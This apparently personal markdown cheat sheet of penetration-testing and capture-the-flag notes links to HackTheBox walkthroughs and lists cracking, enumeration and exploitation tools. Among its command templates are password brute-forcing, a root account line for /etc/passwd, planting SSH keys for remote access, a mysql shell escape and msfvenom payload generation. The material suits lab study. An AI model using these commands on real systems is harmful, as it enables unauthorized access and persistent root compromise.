# OS Agnostic

## Encryption/Decryption

[CyberChef](https://gchq.github.io/CyberChef/): Website for encryption/decryption of many different types at same time

good cipher tools: [http://rumkin.com/](http://rumkin.com/)

one time pad: `pt - ct = key`

decrypt rsa private key: `openssl rsautl -decrypt -inkey <key_file> < <pass.crypt (hex file?encrypted contents of pub key?)>`

* [Ippsec:HacktheBox - Charon](https://www.youtube.com/watch?v=_csbKuOlmdE)

`hydra -e nsr` - additional checks, "n" for null password, "s" try login as pass, "r" try the reverse login as pass

crack password with known format:

```bash
hashcat -m <1600 (hashtype)> <hash.txt> --force -a 3 -1 <char_set> ?1?1?1?1?1?1?1?1 -O
[?1 = use 1 char from '1' set]
```

create wordlist with known character set & length:

```bash
crunch <8 (min_length)> <8 (max_length)> <aefhrt (char_set)> > wordlist.txt
```

get hash formats for [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes)

[Jumbo John](https://github.com/magnumripper/JohnTheRipper)

generate password for insertion into /etc/passwd:

```bash
openssl passwd -l [or 1?] -salt <any_salt_value> <password> 
<username>:<generated_pass>:0:0:root:/root:/bin/bash #enter into /etc/passwd like this
```

[Hashes.org](https://hashes.org/): large database of pre-cracked hashes

Many password lists to download at [skullsecurity](https://wiki.skullsecurity.org/Passwords)

## Binary Exploitation

gdb plugin for exploits/creates patterns for ROP determination: peda.py/pwndbg \[gdb: pattern create \#\#\#\]

ASLR Bypass/binary exploit/gdb:

* [Ippsec:HackTheBox - October](https://www.youtube.com/watch?v=K05mJazHhF4)
* [Ippsec:Camp CTF - Bitterman](https://www.youtube.com/watch?v=6S4A2nhHdWg)
* [pwnTools](https://github.com/Gallopsled/pwntools) - [documentation](http://docs.pwntools.com/en/stable/)
* [Binary Ninja](https://binary.ninja/)

[Packetstorm](https://packetstormsecurity.com/) /bin/sh shellcode

simple binary exploitation [Ippsec:HacktheBox - Sneaky](https://www.youtube.com/watch?v=1UGxjqTnuyo)

[protostar ctf](https://exploit-exercises.com/protostar/) for getting into binary exploitation

## HTTP

in order to proxy tools that have no proxy option: create burn proxy 127.0.0.1:80 [Ippsec:HacktheBox - Granny & Grandpa](https://www.youtube.com/watch?v=ZfPVGJGkORQ)

vulnerability testing for webdav \(or other file upload vulns!\): `davtest`

bypassing filetype filters with http MOVE command to rename allowed filetype [Ippsec:HacktheBox - Granny & Grandpa](https://www.youtube.com/watch?v=ZfPVGJGkORQ)

Wordpress enumeration: `wpscan -u <url> [--disable-tls-checks]`

pull Google cached webpage if not loading: `cache:https://<somewebsite>`

virtual host routing: substitute ip for hostname to get different results

gobuster:

```bash
gobuster -u <url> -l -w <wordlist> -x php -t 20
[-l include length, -x append .php to searches, -t threads]
```

hydra against http wordpress login walkthrough: [IppSec:HacktheBox - Apocalyst](https://www.youtube.com/watch?v=TJVghYBByIA)

## SQL

blind sql injection UNIoN queries: [Ippsec:HacktheBox - Charon](https://www.youtube.com/watch?v=_csbKuOlmdE) use `CONCAT("x","x")`

get shell in mysql: `\! /bin/sh`

[SQL Injection Cheatsheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

## DNS

DNS reverse lookup recon: `dnsrecon -r <ip/subnet[127.0.0.0/24]> -n <ip_to_check>`

DNS zone transfer: `dig axfr <hostname> @<ip>`

add DNS server: `/etc/resolv.conf {nameserver <ip>}`

add Hosts: `/etc/hosts`

## Steganography

extract files from stego'd files: `binwalk -Me <filename>`

## SSH

generate ssh key for reomote access:

```bash
ssh-keygen -f <filename>; cat <filename>;
#copy to remote host
echo <copied_key> > ./.ssh/authorized_keys #on remote host in /home/<user>/
chmod 600 <filename>; 
ssh -i <filename> <remotehost>
```

generate public key from private key:

```bash
ssh-keygen -y -f ~/.ssh/id_rsa > ~/.ssh/id_rsa.pub

#As a side note, the comment of the public key is lost,so you need to edit ~/.ssh/id_rsa.pub 
#append a comment to the first line with a space between the comment and key data. An example public key is shown truncated below.

"ssh-rsa AAAA..../VqDjtS5 ubuntu@ubuntu"
```

If connection is dropped upon connect:

* Don't use bash for this session, try dash \(or /bin/sh\): `ssh 127.0.0.1 /bin/dash`
* Use bash with command options to disable processing startup files:

  ```bash
  ssh 127.0.0.1 "bash --noprofile --norc"
  ```

## Unsorted

shortcut for all ports: `nmap -p-`

Firefox Browser plugins:Tampermonkey \(userscript manager\); Cookie Manager+;

signing APK files: [IppSec:HHC2016 - Debug](https://www.youtube.com/watch?v=fcemTQaosOQ)

view hex of file only: `xxd -p`

reverse from hex: `xxd -r -p > <filename>`

vim:

* Learn vim: `vimtutor`
* [https://www.youtube.com/watch?v=OnUiHLYZgaA](https://www.youtube.com/watch?v=OnUiHLYZgaA)
* vim plugins: fuzzy finder plugin ctrlp /// surround.vim

msfvenom custom exploit making:\[Ippsec:HacktheBox - Granny & Grandpa\]

```bash
msfvenom -p <payload> LHOST=<lhost> etc... -f <filetype [use --help-formats first]>
```

injecting IPs when '.' is disallowed: convert dotted\_decimal to decimal value -[ip2dh](https://github.com/4ndr34z/MyScripts/blob/master/ip2dh.py)

[AndroidAssetStudio](https://romannurik.github.io/AndroidAssetStudio/index.html)

port knocking: [Ippsec:HackTheBox - Nineveh](https://www.youtube.com/watch?v=K9DKULxSBK4)

* iptables knockd

  ```bash
  for i in <port> <port> <port>; do nmap -Pn -p $i --host_timeout 201 --max_retries 0 <ip>; done
  ```

  recursively download all files in hosted folder: `wget -r <ip:port>`

[Hurricane Electric ISP](http://he.net/): Ippsec uses with IPv6 as a psuedo-VPN in [HTB:Sneaky](https://www.youtube.com/watch?v=1UGxjqTnuyo)

IPv6 primer [Ippsec:HacktheBox - Sneaky](https://www.youtube.com/watch?v=1UGxjqTnuyo)

```text
fe80::/10 - febf:ffff:ffff:ffff:ffff:ffff:ffff:ffff Unique Link Local 169.254.x.x APIPA 
(built from MAC address on Linux, 7th bit flips, adds ff:fe in the center)

fc00::/7 - fdff:ffff:ffff:ffff:ffff:ffff:ffff:ffff Unique Local Unicast 10.x.x.x, 172.16.x.x, 192.168.x.x 

2000::/3 - Global Unicast routable 

ff02::1 - Multicast All Nodes 

ff02::2 Multicast ROUTER nodes
```

ip6tables - iptables for ipv6

